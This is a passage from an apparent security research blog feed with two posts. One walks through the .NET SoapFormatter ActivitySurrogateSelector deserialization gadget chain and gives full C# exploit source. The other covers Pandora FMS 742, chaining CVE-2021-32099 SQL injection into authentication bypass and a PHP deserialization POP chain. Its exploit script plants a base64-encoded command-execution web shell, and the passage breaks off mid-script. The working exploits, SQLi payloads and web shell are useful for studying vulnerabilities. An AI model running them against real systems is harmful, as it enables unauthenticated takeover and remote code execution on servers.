ta phải làm cho quá trình deserialize của HashTable bị lỗi, nhảy vào exception để trigger ToString() chứ? Exception này là do nó trả về trước khi malicious của chúng ta execute nên đã nhận thông báo lỗi.\nDo đó, ysoserial.net sử dụng System.Windows.Forms.AxHost.State để xử lý lỗi này, cụ thể khi bị trigger lỗi, hàm này sẽ xử lý. Trong payload, ta set\nkhi đó, this.proBag.Read() được gọi với stream là payload của mình\nĐến đây thì payload sẽ được deserialize 1 lần nữa Khúc này khá ảo. Theo như tôi hiểu, lần đầu deserialize thì sẽ bị lỗi, chúng ta thêm System.Windows.Forms.AxHost.State để handle error này Khi handle error này, payload của chúng ta được deserialize 1 lần nữa. Mà lần deserialize này do đã add handle exception trước đó rồi, nên error sẽ không bị văng ra và malicious sẽ được execute. Full exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 using System; using System.Collections; using System.Collections.Generic; using System.ComponentModel.Design; using System.Data; using System.IO; using System.Linq; using System.Reflection; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Runtime.Serialization.Formatters.Soap; using System.Web.UI.WebControls; namespace LinqBasic { class MySurrogateSelector : SurrogateSelector { public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector) { selector = this; if (!type.IsSerializable) { Type t = Type.GetType(\u0026#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#34;); return (ISerializationSurrogate)Activator.CreateInstance(t); } return base.GetSurrogate(type, context, out selector); } } [Serializable] public class PayloadClass : ISerializable { public byte[] GadgetChains() { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); // Build a chain to map a byte array to creating an instance of a class. // byte[] -\u0026gt; Assembly.Load -\u0026gt; Assembly -\u0026gt; Assembly.GetType -\u0026gt; Type[] -\u0026gt; Activator.CreateInstance -\u0026gt; Win! // step 1 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); // step 2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;), typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); // step 3 var e3 = e2.Select(Activator.CreateInstance); // PagedDataSource maps an arbitrary IEnumerable to an ICollection PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; // AggregateDictionary maps an arbitrary ICollection to an IDictionary // Class is internal so need to use reflection. IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked. DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); // Need to insert IDictionary using reflection. typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); // Pre-load objects, this ensures they\u0026#39;re fixed up before building the hash table. List\u0026lt;object\u0026gt; ls = new List\u0026lt;object\u0026gt;(); ls.Add(e1); ls.Add(e2); ls.Add(e3); ls.Add(pds); ls.Add(verb); ls.Add(dict); Hashtable ht = new Hashtable(); // Add two entries to table. ht.Add(verb, \u0026#34;Hello\u0026#34;); ht.Add(\u0026#34;Dummy\u0026#34;, \u0026#34;Hello2\u0026#34;); // reflection to change buckets FieldInfo fi_keys = ht.GetType().GetField(\u0026#34;buckets\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance); Array keys = (Array)fi_keys.GetValue(ht); FieldInfo fi_key = keys.GetType().GetElementType().GetField(\u0026#34;key\u0026#34;, BindingFlags.Public | BindingFlags.Instance); for (int i = 0; i \u0026lt; keys.Length; ++i) { object bucket = keys.GetValue(i); object key = fi_key.GetValue(bucket); if (key is string) { fi_key.SetValue(bucket, verb); keys.SetValue(bucket, i); break; } } fi_keys.SetValue(ht, keys); ls.Add(ht); BinaryFormatter fmt1 = new BinaryFormatter(); MemoryStream stm = new MemoryStream(); fmt1.SurrogateSelector = new MySurrogateSelector(); fmt1.Serialize(stm, ls); return stm.ToArray(); } public void GetObjectData(SerializationInfo info, StreamingContext context) { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); info.SetType(typeof(System.Windows.Forms.AxHost.State)); info.AddValue(\u0026#34;PropertyBagBinary\u0026#34;, GadgetChains()); } } class Program { static void Main(string[] args) { System.Configuration.ConfigurationManager.AppSettings.Set(\u0026#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck\u0026#34;, \u0026#34;true\u0026#34;); SoapFormatter fmt1 = new SoapFormatter(); SoapFormatter fmt2 = new SoapFormatter(); MemoryStream stm = new MemoryStream(); PayloadClass test = new PayloadClass(); fmt1.SurrogateSelector = new MySurrogateSelector(); //fmt1.Serialize(stm, test.GadgetChains()); fmt1.Serialize(stm, test); stm.Seek(0, SeekOrigin.Begin); fmt2.Deserialize(stm); } } } VI Tổng kết Vậy là đi qua chain này rồi, tới đây và tại thời điểm này tôi nghĩ mình đã hiểu được 90-95% chain này. Đây là một blog dài, nhưng với 1 .Net deserialize 2 tuần như tôi thì qua blog này tôi học được rất nhiều thứ. Và đây là tổng kết flow của chain ActivitySurrogateSelector: Trigger lỗi trong HashTable để execute vào ToString\nTừ ToString đến IEnumerable\n1 ToString -\u0026gt; DesignerVerb -\u0026gt; IDictionary -\u0026gt; AggregateDictionary -\u0026gt; ICollectionICollection -\u0026gt; PagedDataSource -\u0026gt; IEnumerable Từ IEnumerable đến LINQ exploit chain\n1 2 3 byte[] -\u0026gt; Assembly.Load(byte[]) -\u0026gt; Assembly Assembly -\u0026gt; Assembly.GetType() -\u0026gt; Type[] Type[] -\u0026gt; Activator.CreateInstance(Type[]) -\u0026gt; object[] LINQ exploit chain:\nSử dụng ActivitySurrogateSelector+ObjectSurrogate để serialize những class không thể serialize, mục tiêu tại LINQ Dùng LINQ thay thế delegate của nó thành Assembly.Load để load malicious code và tạo 1 instance Dùng System.Windows.Forms.AxHost.State wrap để handle exception.\nVII Nguồn tham khảo .net反序列化之SoapFormatter - 先知社区 (aliyun.com)\nSoapFormatter反序列化链ActivitySurrogateSelector - zpchcbd - 博客园 (cnblogs.com)\n.NET Deserialization 101. Như các bạn đã biết, các ngôn ngữ điều… | by hkln1 | tradahacking (medium0.com)\n","description":"Sau gần một tháng học về JavaDeserialize: học các khái niệm basic, reproduce các commonscollection thì lần này tôi có cơ hội tiếp xúc với .Net deserialize\nCũng là học các kiến thức basic và reproduce các chain kinh điển của .Net deserialize trên [先知社区 (aliyun.com)](https://xz.aliyun.com/u/12258) ","id":4,"section":"posts","tags":["C#"],"title":"[.NET deserialize] SoapFormatter:ActivitySurrogateSelector","uri":"https://minhlongmt183.github.io/posts/dot_net_101_soapformatter_activitysurrogateselector/"},{"content":"From SQLi to PHP deserialize to RCE on Pandora FMS 742 Welcome to my blog, dedicated to unraveling the intricated world of PHP vulnerabilities! Today, I’m thrilled to share my latest research findings on Pandora FMS 742, a prominent network monitoring tool. In my pursuit of enhancing the security landscape, I’ve meticulously analyzed the critical code vulnerabilities inherent in this widely-used software.\nI Introducing Pandora FMS 742 Pandora FMS is a monitoring software that collects data from any system, generates alerts based on that data and shows graphs, reports and maps of our environment. There are two versions of Pandora FMS: a free or Open Source version and a paid or Enterprise version, available starting from 100 devices. II Building the environment To Install Pandora FMS, you can refer directly to Pandora FMS Documentation Installing [Pandora FMS Documentation] or follow the installation guide for Ubuntu from the following links:\nHow To Install Pandora FMS Monitoring Tool in Ubuntu 18.04 (tecmint.com) source: Pandora FMS: Flexible Monitoring System - Browse /Pandora FMS 7.0NG/742/Debian_Ubuntu at SourceForge.net III Exploitation 1. SQL Injection (pre authentication) (CVE-2021-32099) The vulnerability originates from the application’s failure to validate the input values from users in the include/chart_generator.php: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... $user = new PandoraFMS\\User([\u0026#39;phpsessionid\u0026#39; =\u0026gt; $_REQUEST[\u0026#39;session_id\u0026#39;]]); if (check_login(false) === false) { // Error handler. ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Access denied\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/pandora.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/pandora_minimal.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/js/jquery-ui.min.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/js/jquery-ui_custom.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#39;text/javascript\u0026#39; src=\u0026#39;javascript/pandora.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#39;text/javascript\u0026#39; src=\u0026#39;javascript/jquery-3.3.1.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Access is not granted\u0026lt;/h1\u0026gt; \u0026lt;?php echoPhantomCallback(); ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php exit; } At line 2, the session_id value is controlled by the attacker. Let’s delve deeper into the constructor function of the PandoraFMS\\Userclass: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 public function __construct($data) { global $config; // Unset user. unset($config[\u0026#39;id_usuario\u0026#39;]); unset($_SESSION[\u0026#39;id_usuario\u0026#39;]); if (is_array($data) === true) { if (isset($data[\u0026#39;phpsessionid\u0026#39;]) === true) { $this-\u0026gt;sessions[$data[\u0026#39;phpsessionid\u0026#39;]] = 1; $info = \\db_get_row_filter( \u0026#39;tsessions_php\u0026#39;, [\u0026#39;id_session\u0026#39; =\u0026gt; $data[\u0026#39;phpsessionid\u0026#39;]] ); if ($info !== false) { // Process. $session_data = session_decode($info[\u0026#39;data\u0026#39;]); $this-\u0026gt;idUser = $_SESSION[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } return null; } if (isset($data[\u0026#39;id_usuario\u0026#39;]) === true \u0026amp;\u0026amp; isset($data[\u0026#39;password\u0026#39;]) === true ) { $user_in_db = process_user_login($user, $password, true); if ($user_in_db !== false) { $config[\u0026#39;id_usuario\u0026#39;] = $user_in_db; $correctLogin = true; // Originally at api.php. if (session_status() === PHP_SESSION_NONE) { session_start(); } $_SESSION[\u0026#39;id_usuario\u0026#39;] = $user; session_write_close(); $this-\u0026gt;idUser = $data[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } } } return null; } At lines 12-15, the phpsessionid value will be used as an argument for the db_get_row_filter() function. The output of the db_get_row_filter() function is saved in the info variable and $info['data'] will be deserialized using the session_decode() fuction. Let’s delve deeper into the db_get_row_filter function:\n1 2 3 4 5 6 7 8 function db_get_row_filter($table, $filter, $fields=false, $where_join=\u0026#39;AND\u0026#39;, $historydb=false) { global $config; switch ($config[\u0026#39;dbtype\u0026#39;]) { case \u0026#39;mysql\u0026#39;: return mysql_db_get_row_filter($table, $filter, $fields, $where_join, $historydb); ... Because the database being used is MariaDB-mysql, let’s delve deeper into the mysql_db_get_row_filter function at line 7:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function mysql_db_get_row_filter($table, $filter, $fields=false, $where_join=\u0026#39;AND\u0026#39;, $historydb=false) { if (empty($fields)) { $fields = \u0026#39;*\u0026#39;; } else { if (is_array($fields)) { $fields = implode(\u0026#39;,\u0026#39;, $fields); } else if (! is_string($fields)) { return false; } } if (is_array($filter)) { $filter = db_format_array_where_clause_sql($filter, $where_join, \u0026#39; WHERE \u0026#39;); } else if (is_string($filter)) { $filter = \u0026#39;WHERE \u0026#39;.$filter; } else { $filter = \u0026#39;\u0026#39;; } $sql = sprintf(\u0026#39;SELECT %s FROM %s %s\u0026#39;, $fields, $table, $filter); return db_get_row_sql($sql, $historydb); } Yeah, it indicates that the program will construct a SQL query. It is easy to observe the value of SQL query by using a sample payload and debugging program.\nThe used payload is The value of SQL query by debugging: Đây là dấu hiệu của SQLi, bây giờ chúng ta thử truyền vào những kí tự break xem sao This is a signature of a SQL Injection attack. Now, we will use a payload with some ‘break characters’ and observe the results: It doesn’t have any function to filter my payload! Nice! This following payload will make the WHERE clause always true and add a # to comment out any characters following it, if the program allows it. 1 xxxx\u0026#39; or 1=1 # Going deeper into the db_get_row_sql, we can see: 1 2 3 4 5 6 7 8 9 10 11 function db_get_row_sql($sql, $search_history_db=false) { global $config; switch ($config[\u0026#39;dbtype\u0026#39;]) { case \u0026#39;mysql\u0026#39;: return mysql_db_get_row_sql($sql, $search_history_db); break; case \u0026#39;postgresql\u0026#39;: return postgresql_db_get_row_sql($sql, $search_history_db); This program calls the mysql_db_get_row_sql($sql, $search_history_db); function since it utilizes the MYSQL database. The following code represents the definition of mysql_db_get_row_sql at line 7:\n1 2 3 4 5 6 7 8 9 10 11 function mysql_db_get_row_sql($sql, $search_history_db=false) { $sql .= \u0026#39; LIMIT 1\u0026#39;; $result = db_get_all_rows_sql($sql, $search_history_db); if ($result === false) { return false; } return $result[0]; } This function adds the string ' LIMIT 1' to retrieve the first value. It executes the db_get_all_rows_sql($sql, $search_history_db) function, saves the output to the $result array and returns the result[0]. I tried sending my payload and retrieving data directly from MySQL to observe the results: It is clear that sessions that did not successfully log in will a have null value in the ‘data’ field, while sessions with successful logins will have data stored in this field. So we can use this payload to exploit 1 xxx\u0026#39; UNION SELECT \u0026#39;a\u0026#39;,1,\u0026#39;id_usuario|s:5:\u0026#34;admin\u0026#34;;\u0026#39; as data FROM tsessions_php WHERE \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; # POC\npandora-php.mp4\n2. FUNNY: PHP deserialization attack via session_decode() function a. Session_decode() In the blog post, there is a description as follows: Note that the function session_decode() is capable of deserializing arbitrary objects similar to the function unserialize(). This means that an attacker could deserialize arbitrary objects via the SQL Injection and this can be another attack vector.\nLet’s examine the code in __construct() function of include/lib/User.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 public function __construct($data) { global $config; // Unset user. unset($config[\u0026#39;id_usuario\u0026#39;]); unset($_SESSION[\u0026#39;id_usuario\u0026#39;]); if (is_array($data) === true) { if (isset($data[\u0026#39;phpsessionid\u0026#39;]) === true) { $this-\u0026gt;sessions[$data[\u0026#39;phpsessionid\u0026#39;]] = 1; $info = \\db_get_row_filter( \u0026#39;tsessions_php\u0026#39;, [\u0026#39;id_session\u0026#39; =\u0026gt; $data[\u0026#39;phpsessionid\u0026#39;]] ); if ($info !== false) { // Process. $session_data = session_decode($info[\u0026#39;data\u0026#39;]); $this-\u0026gt;idUser = $_SESSION[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } return null; } if (isset($data[\u0026#39;id_usuario\u0026#39;]) === true \u0026amp;\u0026amp; isset($data[\u0026#39;password\u0026#39;]) === true ) { $user_in_db = process_user_login($user, $password, true); if ($user_in_db !== false) { $config[\u0026#39;id_usuario\u0026#39;] = $user_in_db; $correctLogin = true; // Originally at api.php. if (session_status() === PHP_SESSION_NONE) { session_start(); } $_SESSION[\u0026#39;id_usuario\u0026#39;] = $user; session_write_close(); $this-\u0026gt;idUser = $data[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } } } return null; } At line 19, we can see: 1 $session_data = session_decode($info[\u0026#39;data\u0026#39;]); The value of $info['data'] is passed to session_decode() function. Below is an example of a valid value stored in the database:\n1 2 id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0 id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:\u0026#34;e7c2afc1ece9d83b21ca017a98586068\u0026#34; These values are in the form of serialized strings. So, the attack vector here would be as follows:\nThe attacker utilizes SQL injection to insert exploit code into $info['data']. The program will load the content provided by the attacker and trigger the payload in the session_decode($info['data']) function. One advantage of setting up a debug environment is that we can modify the values of variables as desired before proceeding with the next command. Here, I will make direct modifications during the debug process to verify.\nIn order for the attacker to insert data into the SQL, we have two approaches:\nHow to customize the payload into an insert data statement, as our query statement has the following format: 1 \u0026#34;SELECT * FROM tsessions_php WHERE `id_session` = \u0026#39;\u0026lt;payload_injected\u0026gt;\u0026#39; LIMIT 1;\u0026#34; Locate the location where the SQL saves the session data into the database and modify it. After about an hour of searching and thinking, I realized that I had been going in the wrong direction 😟. Actually, we don’t need to insert data directly into the database, but rather manipulate the query in a way that it returns the value we control. If it seems a bit confusing, take a look at the following query:\n1 \u0026#34;SELECT * FROM tsessions_php WHERE `id_session` = \u0026#39;xxxxx\u0026#39; union select \u0026#39;1\u0026#39;,0,\u0026#39;xxx\u0026#39; as data#\u0026#39;\u0026#34; The above query uses the UNION operator to combine two sets of data. In this case, the first part of the WHERE clause is always false, resulting in a null value. However, the second part of the query returns the desired values: '1', 0, 'xxx'.\nBy ultilzing the UNION opertor, we can merge our own data with the original query’s result set. This allows to control the returned values and manipulate the query’s outcome to our advantage.\nBy doing this, I have successfully gained control over the value passed to the session_decode() function. Now we can move on the next step, which is building the exploit.\nb. Building a POP chain. a. Methology: Identify magic methods within classes that can be called by session_decode. Search for existing chains related to Pandora FMS on the internet and customize them. Utilize chains from other frameworks in PHP-GCC as inspiration. New idea: Invoke functions, use SQL to bypass authentication, and use session_decode() to modify properties within classes. Building a pop chain One challenge encountered when building a pop chain is not knowing which classes have been instantiated and can be invoked at runtime.\n⇒ Solution: Use console debug or print statements to identify the instantiated classes\n1 2 3 4 5 $classes = get_declared_classes(); ****foreach ($classes as $class) { echo $class . \u0026#34;\\n\u0026#34;; } By using the above method, we have obtained a list of classes that can be invoked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 stdClass Exception ErrorException Error ParseError TypeError ArgumentCountError ArithmeticError DivisionByZeroError Closure Generator ClosedGeneratorException DateTime DateTimeImmutable DateTimeZone DateInterval DatePeriod LibXMLError HashContext ReflectionException Reflection ReflectionFunctionAbstract ReflectionFunction ReflectionGenerator ReflectionParameter ReflectionType ReflectionNamedType ReflectionMethod ReflectionClass ReflectionObject ReflectionProperty ReflectionClassConstant ReflectionExtension ReflectionZendExtension LogicException BadFunctionCallException BadMethodCallException DomainException InvalidArgumentException LengthException OutOfRangeException RuntimeException OutOfBoundsException OverflowException RangeException UnderflowException UnexpectedValueException RecursiveIteratorIterator IteratorIterator FilterIterator RecursiveFilterIterator CallbackFilterIterator RecursiveCallbackFilterIterator ParentIterator LimitIterator CachingIterator RecursiveCachingIterator NoRewindIterator AppendIterator InfiniteIterator RegexIterator RecursiveRegexIterator EmptyIterator RecursiveTreeIterator ArrayObject ArrayIterator RecursiveArrayIterator SplFileInfo DirectoryIterator FilesystemIterator RecursiveDirectoryIterator GlobIterator SplFileObject SplTempFileObject SplDoublyLinkedList SplQueue SplStack SplHeap SplMinHeap SplMaxHeap SplPriorityQueue SplFixedArray SplObjectStorage MultipleIterator SodiumException SessionHandler __PHP_Incomplete_Class php_user_filter Directory AssertionError PDOException PDO PDOStatement PDORow CURLFile DOMException DOMStringList DOMNameList DOMImplementationList DOMImplementationSource DOMImplementation DOMNode DOMNameSpaceNode DOMDocumentFragment DOMDocument DOMNodeList DOMNamedNodeMap DOMCharacterData DOMAttr DOMElement DOMText DOMComment DOMTypeinfo DOMUserDataHandler DOMDomError DOMErrorHandler DOMLocator DOMConfiguration DOMCdataSection DOMDocumentType DOMNotation DOMEntity DOMEntityReference DOMProcessingInstruction DOMStringExtend DOMXPath finfo mysqli_sql_exception mysqli_driver mysqli mysqli_warning mysqli_result mysqli_stmt PharException Phar PharData PharFileInfo SimpleXMLElement SimpleXMLIterator SNMP SNMPException XMLReader XMLWriter XSLTProcessor ZipArchive StreamReader StringReader FileReader CachedFileReader gettext_reader PandoraFMS\\User NetworkMap I have found an unauthenticated endpoint, but I haven\u0026rsquo;t been able to control the path:\n1 2 3 4 5 6 7 8 9 GET /pandora_console/include/Image/image_functions.php?getFile=/tmp/test.png\u0026amp;file=tumb_600x400_test.png\u0026amp;thumb=edisc\u0026amp;thumb_size=600x400 HTTP/1.1 Host: 192.168.159.135 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 When searching on the internet, I came across a paper discussing it : https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\nIf we have complete control of a string within the $_SESSION array which occurs within the first 100\nbytes we can use a similar technique to cause the session file to be a valid Phar/Tar archive\nTo gain a better understanding, I would recommend asking ChatGPT for further clarification 😉\nThe session data in PHP is typically stored on the server-side as files, which are created and managed by PHP\u0026rsquo;s session handler. By default, these files are stored in a directory specified by the session.save_path directive in the php.ini configuration file.\nIn some cases, an attacker may be able to manipulate the session data to execute arbitrary code on the server. One such attack involves abusing the fact that PHP\u0026rsquo;s session_start() function automatically unserializes the session data stored in the session file.\nIf an attacker has complete control over a string within the first 100 bytes of the session data, they can use a technique called \u0026ldquo;phar deserialization\u0026rdquo; to create a valid Phar/Tar archive within the session file. This can be accomplished by crafting a string that contains a serialized Phar object, followed by arbitrary data that will be interpreted as the contents of the Phar archive.\nWhen the session data is unserialized by PHP, the Phar object will be deserialized and the contents of the archive will be written to disk. This can allow an attacker to write arbitrary files to the server, which could be used to execute arbitrary code or perform other malicious actions.\nTo protect against this attack, it is important to properly sanitize and validate all user input, and to avoid using user-controlled data within the session data. Additionally, it is recommended to set the session.serialize_handler directive to a value other than php (such as igbinary), which can provide additional protection against deserialization attacks.\nThe phpgcc tool provides a chain to exploit the vendor Swiftmailer, which Pandora is using. We can build an exploit chain using it. However, one issue we encountered is that the session_decode() function does not load Swiftmailer, causing the classes and objects of that class to be unreadable, resulting in the payload being unable to execute.\nAfter a period of research, I discovered that the payload passed into the session is stored in the database. Each time the website is accessed, the session is loaded and decoded. At that point, our payload will be deserialized. With this mindset, after injecting the session into the database, we only need to access a location that loads the vendor to exploit it. In this case, it is the path ws.php. For more details about the deserialization vulnerability in the Swiftmailer vendor, you can refer to the following link: https://github.com/CFandR-github/advisory/blob/main/phpmailer_rce_poi/phpmailer_unserialize_rce_0day.md\nSure, let’s proceed with building the payload and exploit. One thing to note here is that there is a difference between the exploitation payload for this context and the payload used in PHPGCC.\nAdditionally, there are differences in the construction of the serialized string with various properties.\nFor the serialization of objects, the data serialized by member variables under different permission modifiers is also different:\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class TestClass { PermissionDecorator $testMember; public function __construct($t) { $this-\u0026gt;testMember = $t; } } $data = new TestClass(\u0026#34;edisc12\u0026#34;); public：\n1 \u0026#34;O:9:\u0026#34;TestClass\u0026#34;:1:{s:10:\u0026#34;testMember\u0026#34;;s:7:\u0026#34;edisc12\u0026#34;;}\u0026#34; protected：\n1 \u0026#34;O:9:\u0026#34;TestClass\u0026#34;:1:{s:13:\u0026#34;\\x00*\\x00testMember\u0026#34;;s:7:\u0026#34;edisc12\u0026#34;;}\u0026#34; private：\n1 \u0026#34;O:9:\u0026#34;TestClass\u0026#34;:1:{s:21:\u0026#34;\\x00TestClass\\x00testMember\u0026#34;;s:7:\u0026#34;edisc12\u0026#34;;}\u0026#34; Below is my exploit code: exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 \u0026lt;?php // include \u0026#39;unserialize.php\u0026#39;; session_start(); class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream{} class Swift_Events_SimpleEventDispatcher{} class Swift_Transport_SendmailTransport { public $buffer; public $started; public $eventDispatcher; } abstract class Swift_ByteStream_AbstractFilterableInputStream{ private $filters = []; private $writeBuffer = \u0026#39;\u0026lt;?php eval(base64_decode(\u0026#34;IGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpIHsgc3lzdGVtKCRfR0VUWydjbWQnXSk7IH0g\u0026#34;));?\u0026gt;//\u0026#39;; } function httpGet($url, $sessionId) { $status = false; $curl = curl_init($url); $header = [\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39;]; $header[] = \u0026#39;Cookie: PHPSESSID=\u0026#39;.$sessionId; curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HTTPHEADER, $header); curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy $response = curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); // Get the HTTP response code if ($httpCode === 302){ $status = true; } curl_close($curl); return $status; } function httpPost($url, $data) { $curl = curl_init($url); curl_setopt_array($curl, [ CURLOPT_POST =\u0026gt; true, CURLOPT_HTTPHEADER =\u0026gt; [\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39;], CURLOPT_HEADER =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; $data, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; \u0026#39;127.0.0.1:8080\u0026#39;, //proxy ]); $response = curl_exec($curl); // var_dump($response); if (strpos($response, \u0026#34;Pandora FMS Graph ( - )\u0026#34;) !== false) { echo \u0026#34;[+] Inject payload successful!\u0026#34; . PHP_EOL; } else { echo \u0026#34;[!]Inject payload failed!\u0026#34; . PHP_EOL; die(); } curl_close($curl); return $response; } function exploit($host) { // Create Swift_Transport_SendmailTransport instance and set its properties $payload = new Swift_Transport_SendmailTransport(); $payload-\u0026gt;buffer = new Swift_ByteStream_FileByteStream(); $payload-\u0026gt;buffer-\u0026gt;path = \u0026#34;/var/www/html/pandora_console/shell.php\u0026#34;; $payload-\u0026gt;buffer-\u0026gt;mode = \u0026#34;w+b\u0026#34;; $payload-\u0026gt;started = true; $payload-\u0026gt;eventDispatcher = new Swift_Events_SimpleEventDispatcher(); // Set session variables $_SESSION[\u0026#39;id_usuario\u0026#39;] = \u0026#39;admin\u0026#39;; $_SESSION[\u0026#39;alert_msg\u0026#39;] = array(); $_SESSION[\u0026#39;new_chat\u0026#39;] = false; // Set the payload instance as session data $_SESSION[\u0026#39;vulnClass\u0026#39;] = $payload; // Encode the session data $encodedData = session_encode(); // echo PHP_EOL . PHP_EOL . \u0026#34;Encoded session data: \u0026#34; . $encodedData . PHP_EOL; // Decode the session data session_decode($encodedData); // echo \u0026#34;Decoded session data: \u0026#34; . PHP_EOL; // Send request echo PHP_EOL . \u0026#34;[+] Send payload...\u0026#34; . PHP_EOL; $url = $host . \u0026#39;/pandora_console/include/chart_generator.php\u0026#39;; $data = \u0026#39;session_id=\u0026#39; . urlencode(\u0026#39;xxxxx\\\u0026#39; union select 